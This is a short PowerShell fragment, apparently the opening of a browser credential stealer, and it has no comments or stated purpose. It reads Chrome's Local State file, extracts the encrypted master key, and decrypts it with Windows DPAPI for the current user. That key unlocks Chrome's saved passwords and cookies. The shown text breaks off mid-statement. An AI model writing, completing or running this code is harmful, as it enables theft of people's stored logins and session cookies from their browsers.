Add-Type -AssemblyName System.Security

$chrome_path_local_state = $env:LOCALAPPDATA + "\Google\Chrome\User Data\Local State"
$CHROME_PATH = $env:LOCALAPPDATA + "\Google\Chrome\User Data"

$secret = Get-Content -Raw -Path $chrome_path_local_state | ConvertFrom-Json
$secretkey = $secret.os_crypt.encrypted_key
$cipher = [Convert]::FromBase64String($secretkey)

$key = [System.Security.Cryptography.ProtectedData]::Unprotect($cipher[5..$cipher.length],$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser